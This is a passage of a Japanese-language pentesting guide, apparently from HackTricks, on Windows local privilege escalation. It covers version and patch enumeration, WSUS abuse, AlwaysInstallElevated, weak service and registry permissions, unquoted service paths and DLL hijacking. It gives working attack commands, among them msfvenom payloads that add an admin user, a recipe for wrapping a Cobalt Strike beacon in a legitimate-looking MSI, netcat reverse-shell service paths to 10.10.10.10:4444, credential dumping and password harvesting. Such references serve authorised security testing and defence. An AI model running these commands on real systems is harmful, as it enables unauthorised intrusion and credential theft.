# Windows ローカル権限昇格

{{#include ../../banners/hacktricks-training.md}}

### **Windows のローカル権限昇格ベクターを探すための最良のツール:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Windows の基礎理論

### アクセストークン

**Windows のアクセストークンを知らない場合は、先に進む前に次のページを読んでください：**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs についての詳細は次のページを確認してください：**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows の integrity levels が何か分からない場合は、続行する前に次のページを読んでください：**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows セキュリティコントロール

Windows には、システムの列挙を**妨げる**、実行ファイルの実行を阻止する、さらにはあなたの活動を**検出する**などのさまざまな機能があります。権限昇格の列挙を開始する前に、次の**ページ**を**読み**、これらすべての**防御****メカニズム**を**列挙**してください：


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## システム情報

### バージョン情報の列挙

Windows のバージョンに既知の脆弱性がないか確認してください（適用されているパッチも確認してください）。
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### バージョンエクスプロイト

This [site](https://msrc.microsoft.com/update-guide/vulnerability) is handy for searching out detailed information about Microsoft security vulnerabilities. This database has more than 4,700 security vulnerabilities, showing the **膨大な攻撃面** that a Windows environment presents.

**システム上で**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_

**システム情報を使ったローカルで**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**エクスプロイトのGithubリポジトリ:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### 環境

環境変数に資格情報や有用な情報が保存されていますか？
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell の履歴
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell トランスクリプトファイル

この機能を有効にする方法は [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) で学べます。
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell のパイプライン実行の詳細（実行されたコマンド、コマンド呼び出し、スクリプトの一部など）が記録されます。ただし、実行のすべての詳細や出力結果が完全に取得されない場合があります。

これを有効にするには、ドキュメントの「Transcript files」セクションの手順に従い、**"Module Logging"** を **"Powershell Transcription"** の代わりに選択してください。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Powershell ログの最後の15件のイベントを表示するには、次を実行してください:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

スクリプトの実行に関する完全な活動記録と全内容が取得され、各コードブロックが実行時に記録されることが保証されます。このプロセスにより、各操作の包括的な監査証跡が保持され、フォレンジックや悪意のある挙動の解析に有用です。実行時のすべての活動を文書化することで、プロセスに関する詳細な洞察が得られます。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block のログイベントは Windows Event Viewer の次のパスにあります: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
最後の20件のイベントを表示するには、次を使用できます:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### インターネット設定
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### ドライブ
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

更新が http**S** ではなく http で要求されている場合、システムを侵害できます。

まず、cmd で次を実行してネットワークが non-SSL WSUS 更新を使用しているか確認します:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
または、PowerShell で次のように:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
次のような返信が返ってきた場合:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
そして、`HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` または `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` が `1` と等しい場合。

その場合、**悪用可能です。** 最後のレジストリが 0 と等しい場合、WSUS エントリは無視されます。

この脆弱性を悪用するためには、次のようなツールを使用できます: [Wsuxploit](https://github.com/pimps/wsuxploit)、[pyWSUS](https://github.com/GoSecure/pywsus) - これらは MiTM により武装されたエクスプロイトスクリプトで、非 SSL の WSUS トラフィックに「偽」更新を注入します。

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**完全なレポートはこちら**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
基本的に、これはこのバグが悪用する欠陥です:

> ローカルユーザのプロキシを変更する権限があり、Windows Updates が Internet Explorer の設定で構成されたプロキシを使用する場合、[PyWSUS](https://github.com/GoSecure/pywsus) をローカルで実行して自分のトラフィックを傍受し、アセット上で特権昇格したユーザとしてコードを実行することが可能になります。
>
> さらに、WSUS サービスは現在のユーザの設定を使用するため、その証明書ストアも使用します。WSUS ホスト名用の自己署名証明書を生成し、それを現在のユーザの証明書ストアに追加すれば、HTTP と HTTPS の WSUS トラフィックの両方を傍受できます。WSUS は証明書に対してトラスト・オン・ファースト・ユース型の検証を実装するための HSTS-like のようなメカニズムを持っていません。提示された証明書がユーザにより信頼され、正しいホスト名を持っていれば、サービスはそれを受け入れます。

この脆弱性はツール [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) を使用して悪用できます（入手可能になれば）。

## サードパーティの Auto-Updaters と Agent IPC (local privesc)

多くのエンタープライズエージェントは、localhost の IPC インターフェースと特権化されたアップデートチャネルを公開しています。登録先が攻撃者のサーバーに誘導され、updater が不正なルート CA や弱い署名チェックを信頼する場合、ローカルユーザは SYSTEM サービスがインストールする悪意のある MSI を配布できます。一般化した手法（Netskope stAgentSvc チェーンに基づく – CVE-2025-0309）はこちらを参照：

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## KrbRelayUp

Windows **domain** 環境において、特定の条件下で **local privilege escalation** の脆弱性が存在します。これらの条件には、**LDAP signing が強制されていない**環境、ユーザが **Resource-Based Constrained Delegation (RBCD)** を設定できる自己権限を持っていること、およびユーザがドメイン内にコンピュータを作成できる能力が含まれます。これらの **要件** は **default settings** でも満たされることに注意してください。

Find the **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

For more information about the flow of the attack check [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**If** these 2 registers are **enabled** (value is **0x1**), then users of any privilege can **install** (execute) `*.msi` files as NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
meterpreter セッションがある場合、このテクニックはモジュール **`exploit/windows/local/always_install_elevated`** を使って自動化できます。

### PowerUP

power-up の `Write-UserAddMSI` コマンドを使用して、カレントディレクトリ内に権限昇格用の Windows MSI バイナリを作成します。このスクリプトは、ユーザー/グループ追加を促すプリコンパイル済みの MSI インストーラを書き出します（そのため GIU アクセスが必要になります）：
```
Write-UserAddMSI
```
作成したバイナリを実行するだけで権限を昇格できます。

### MSI Wrapper

このチュートリアルを読んで、このツールを使ってMSIラッパーを作成する方法を学んでください。注意: "**.bat**" ファイルは、**コマンドライン**を**実行**したいだけの場合にラップできます


{{#ref}}
msi-wrapper.md
{{#endref}}

### WIXでMSIを作成


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Visual StudioでMSIを作成

- **Cobalt Strike** または **Metasploit** で `C:\privesc\beacon.exe` に新しい Windows EXE TCP payload を**生成**します
- **Visual Studio** を開き、検索ボックスに "Create a new project" と入力します。**Setup Wizard** プロジェクトを選択して **Next** をクリックします。
- プロジェクト名を **AlwaysPrivesc** のように付け、場所に **`C:\privesc`** を使用し、**place solution and project in the same directory** を選択して **Create** をクリックします。
- 3/4 のステップ（含めるファイルの選択）に到達するまで **Next** をクリックし続けます。**Add** をクリックして先ほど生成した Beacon ペイロードを選択します。次に **Finish** をクリックします。
- **Solution Explorer** で **AlwaysPrivesc** プロジェクトをハイライトし、**Properties** で **TargetPlatform** を **x86** から **x64** に変更します。
- インストールされたアプリをより正当らしく見せるために、**Author** や **Manufacturer** などのプロパティを変更できます。
- プロジェクトを右クリックし **View > Custom Actions** を選択します。
- **Install** を右クリックして **Add Custom Action** を選択します。
- **Application Folder** をダブルクリックし、**beacon.exe** ファイルを選択して **OK** をクリックします。これにより、インストーラーが実行されるとすぐに beacon ペイロードが実行されます。
- **Custom Action Properties** の下で **Run64Bit** を **True** に変更します。
- 最後に、**ビルド**します。
- 警告 `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` が表示された場合は、プラットフォームを x64 に設定したか確認してください。

### MSI Installation

悪意のある `.msi` ファイルのインストールをバックグラウンドで実行するには:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
この脆弱性をエクスプロイトするには、次を使用できます: _exploit/windows/local/always_install_elevated_

## アンチウイルスと検出

### 監査設定

これらの設定は何が**記録**されるかを決定するため、注意を払うべきです。
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding は、logs がどこに送信されているかを知ると興味深い。
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** は、ドメインに参加しているコンピュータの **ローカル Administrator パスワードの管理** を目的としており、各パスワードが **一意でランダム化され、定期的に更新される** ことを保証します。これらのパスワードは Active Directory に安全に格納され、ACL を通じて十分な権限が付与されたユーザーのみがアクセスでき、承認されている場合にローカル管理者パスワードを表示できます。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

有効な場合、**平文のパスワードが LSASS に保存されます** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1** 以降、Microsoft は Local Security Authority (LSA) の保護を強化し、信頼されていないプロセスがそのメモリを **読み取る** 試みやコード注入を **ブロック** して、システムをさらに保護しています。\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** は **Windows 10** で導入されました。目的は、デバイスに保存されている認証情報を pass-the-hash 攻撃のような脅威から保護することです.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### キャッシュされた資格情報

**ドメイン資格情報**は**Local Security Authority** (LSA) によって認証され、オペレーティングシステムのコンポーネントによって利用されます。ユーザーのログオン情報が登録済みのセキュリティパッケージによって認証されると、通常そのユーザーのドメイン資格情報が確立されます。\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## ユーザーとグループ

### ユーザーとグループの列挙

自分が所属するグループのうち、興味深い権限を持つものがないか確認すべきです。
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### 特権グループ

もしあなたが**ある特権グループに属している場合、権限を昇格できる可能性があります**。特権グループとそれを悪用して権限を昇格させる方法については、こちらを参照してください：


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### トークン操作

**詳しく知る**ために、このページで**トークン**が何かを確認してください: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
以下のページを確認して、**興味深いトークンについて学ぶ**とそれらを悪用する方法を学んでください：


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### ログオンユーザー / セッション
```bash
qwinsta
klist sessions
```
### ホームフォルダ
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### パスワードポリシー
```bash
net accounts
```
### クリップボードの内容を取得する
```bash
powershell -command "Get-Clipboard"
```
## 実行中のプロセス

### ファイルとフォルダの権限

まず、プロセスを列挙して、**プロセスのコマンドライン内にパスワードが含まれていないかを確認してください**。\
**実行中のバイナリを上書きできるか**、またはバイナリフォルダに書き込み権限があり、潜在的な [**DLL Hijacking attacks**](dll-hijacking/index.html) を悪用できるかを確認します:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
常に [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md) が実行されているか確認してください。

**プロセスのバイナリのパーミッションを確認する**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**プロセスのバイナリが置かれているフォルダの権限を確認する (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

実行中のプロセスのメモリダンプは、sysinternals の **procdump** を使って作成できます。FTP のようなサービスは **credentials in clear text in memory** を保持していることがあるため、メモリをダンプしてそれらの credentials を読み取ってみてください。
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### 安全でない GUI アプリ

**SYSTEM として実行されているアプリケーションは、ユーザーが CMD を起動したり、ディレクトリを参照したりできる場合があります。**

例: "Windows Help and Support" (Windows + F1) を開き、"command prompt" を検索し、"Click to open Command Prompt" をクリック

## サービス

サービスの一覧を取得する:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### 権限

サービスの情報を取得するには **sc** を使用できます
```bash
sc qc <service_name>
```
各サービスに必要な権限レベルを確認するために、_Sysinternals_ のバイナリ **accesschk** を用意しておくことを推奨します。
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
"Authenticated Users"が任意のサービスを変更できるかどうかを確認することを推奨します:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### サービスを有効化する

もし次のようなエラーが発生している場合（例: SSDPSRV）:

_システム エラー 1058 が発生しました._\
_そのサービスは無効になっているか、関連付けられた有効なデバイスがないため、開始できません。_

次の方法で有効にできます
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**サービス upnphost は動作するために SSDPSRV に依存していることに注意してください（XP SP1 の場合）**

**別の回避策** この問題に対して次を実行します:
```
sc.exe config usosvc start= auto
```
### **サービスのバイナリパスを変更する**

サービスに対して "Authenticated users" グループが **SERVICE_ALL_ACCESS** を持っている場合、そのサービスの実行バイナリを変更することが可能です。**sc** を変更して実行するには：
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### サービスの再起動
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
特権は次のような様々な権限を通じて昇格できます:

- **SERVICE_CHANGE_CONFIG**: サービスバイナリの再設定を許可します。
- **WRITE_DAC**: 権限の再設定を可能にし、サービス構成の変更につながります。
- **WRITE_OWNER**: 所有権の取得と権限の再設定を許可します。
- **GENERIC_WRITE**: サービス構成を変更する能力を継承します。
- **GENERIC_ALL**: 同様にサービス構成を変更する能力を継承します。

この脆弱性の検出と悪用には、_exploit/windows/local/service_permissions_ を利用できます。

### サービスバイナリの弱い権限

**サービスによって実行されるバイナリを変更できるか確認する** またはバイナリがあるフォルダに**書き込み権限があるか**確認する ([**DLL Hijacking**](dll-hijacking/index.html))**.**\  
サービスによって実行されるすべてのバイナリは **wmic**（system32にはない）を使って取得でき、権限は **icacls** で確認できます:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
また、**sc** と **icacls** を使用できます:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Services registry の変更権限

任意の service registry を変更できるか確認してください。\
次の方法で、サービス **registry** に対するあなたの **permissions** を **check** できます:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
**Authenticated Users** または **NT AUTHORITY\INTERACTIVE** が `FullControl` 権限を持っているか確認する必要があります。もしそうであれば、サービスによって実行されるバイナリを改変できます。

実行されるバイナリの Path を変更するには:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Services registry AppendData/AddSubdirectory permissions

レジストリに対してこの権限があるということは、**このレジストリからサブレジストリを作成できる**という意味です。Windows services の場合、これは**任意のコードを実行するのに十分**です：

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

実行ファイルへのパスが引用符で囲まれていない場合、Windows はスペースの前までの各区切りを順に実行しようとします。

例えば、パス _C:\Program Files\Some Folder\Service.exe_ の場合、Windows は次のように実行を試みます：
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
組み込みの Windows サービスに属するものを除き、引用符で囲まれていないサービスパスをすべて一覧表示する:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**metasploitでこの脆弱性を検出および exploit できます**: `exploit/windows/local/trusted\_service\_path`  
metasploitを使ってサービスバイナリを手動で作成できます:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### 回復アクション

Windowsでは、サービスが失敗した場合に実行するアクションをユーザが指定できます。この機能は特定の binary を指すように設定できます。この binary を差し替え可能であれば、privilege escalation が発生する可能性があります。詳細は[official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>)を参照してください。

## アプリケーション

### インストール済みアプリケーション

**binaries の権限**（binaries のうち1つを上書きして escalate privileges できるかもしれません）および **フォルダ** の権限を確認してください（[DLL Hijacking](dll-hijacking/index.html)）。
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### 書き込み権限

特定のファイルを読み取るために、config ファイルを変更できるか、または管理者アカウントで実行されるバイナリを変更できるか確認してください（schedtasks）。

システム内の弱いフォルダ/ファイルの権限を見つける方法の一つは、次のようにすることです:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### 起動時に実行

**別のユーザーによって実行される registry や binary を上書きできるか確認してください。**\
**読む** the **以下のページ** で、興味深い **autoruns locations to escalate privileges** について詳しく学んでください：

{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### ドライバー

可能性のある**サードパーティの挙動不審/脆弱な**ドライバーを探してください
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
ドライバが arbitrary kernel read/write primitive を公開している場合（poorly designed IOCTL handlers によく見られる）、SYSTEM token をカーネルメモリから直接盗み取ることで権限を昇格できます。ステップ‑バイ‑ステップの手法は次を参照：

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}


## PATH DLL Hijacking

もし PATH に存在するフォルダ内に**write permissions**があると、プロセスに読み込まれるDLLをハイジャックして**escalate privileges**できる可能性があります。

PATH 内のすべてのフォルダの権限を確認する:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
このチェックを悪用する方法の詳細については:

{{#ref}}
dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

## ネットワーク

### 共有
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts ファイル

hosts ファイルにハードコードされた他の既知のコンピュータがないか確認する
```
type C:\Windows\System32\drivers\etc\hosts
```
### ネットワークインターフェースと DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Open Ports

外部から**restricted services**を確認する
```bash
netstat -ano #Opened ports?
```
### ルーティングテーブル
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP テーブル
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### ファイアウォールのルール

[**ファイアウォール関連のコマンドはこのページを確認してください**](../basic-cmd-for-pentesters.md#firewall) **(ルールの一覧、ルールの作成、無効化、無効化...)**

さらに[ネットワーク列挙のコマンドはこちら](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
バイナリ `bash.exe` は `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` にも見つかります。

root user を取得すると、任意のポートで listen できます（`nc.exe` を初めてポートで listen に使うと、GUI により `nc` を firewall で許可するか確認されます）。
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
bashをrootとして簡単に起動するには、`--default-user root` を試してください。

